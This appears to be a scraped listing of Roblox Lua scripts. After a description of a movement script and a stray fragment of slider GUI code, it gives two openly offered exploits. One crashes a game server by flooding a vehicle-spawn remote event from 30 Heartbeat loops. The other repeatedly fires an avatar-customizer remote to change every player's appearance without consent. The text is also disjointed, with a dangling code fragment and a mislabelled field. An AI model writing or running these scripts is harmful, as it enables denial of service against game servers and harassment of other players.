scripts.title: Source Engine Movement
scripts.features:
Key Features:
Momentum-Based Movement: Implements classic acceleration and friction models.
Bunnyhopping (Bhop): Allows bhop.
Air Strafing: Precise control over mid-air trajectory using directional inputs.
Rocket Jumping: Custom projectile mechanics that apply explosion-based knockback for vertical mobility.
Integrated Sound Engine: Custom audio for footsteps, jumping, landing, and explosions.
Dynamic Ground Detection: Uses raycasting for accurate state transitions (ground/air).
Control Interface: On-screen GUI to toggle the movement system or safely destroy the script.

Controls:
Key	Action
Space (Hold)	Continuous Bunnyhopping
W, A, S, D	Directional Movement & Air Strafing
X	Launch Rocket (for Rocket Jumping)
ON/OFF Button	Toggle the movement system
DESTROY Button	Reverts physics to default and removes the script

    SliderButton.MouseMoved:Connect(function(x, y)
        if dragging then
            local pos = math.clamp((x - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
            local value = math.floor(min + (max - min) * pos)
            
            ValueLabel.Text = tostring(value)

scripts.features: crash server
scripts.script:
-- @build-failed
-- crash server

local runservice = game:GetService("RunService")

local SpawnVehicleEvent = game:GetService("ReplicatedStorage"):WaitForChild("SimpleFrameworkRemotes"):WaitForChild("VehicleService"):WaitForChild("SpawnVehicle")

for i = 1, 30 do
    runservice.Heartbeat:Connect(function()
        SpawnVehicleEvent:FireServer("BigDuty", 1)
    end)
end

scripts.title: force everyone to be naked               Open Source
scripts.features: force everyone to be naked
scripts.script:
-- @build-failed
-- force everyone to be naked

local getservice = game.GetService
local players = getservice(game, "Players")

local AvatarCustomizer_ApplyDescriptionEvent = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("AvatarCustomizer_ApplyDescription")
local HumanoidDescription = workspace.Game.Main.Leaderboards.DonationsModel.Humanoid.HumanoidDescription
while task.wait(0.1) do
    for _, player in players:GetPlayers() do
        local args = {
           	player.Character,
           	HumanoidDescription
        }
        AvatarCustomizer_ApplyDescriptionEvent:FireServer(unpack(args))
    end
end
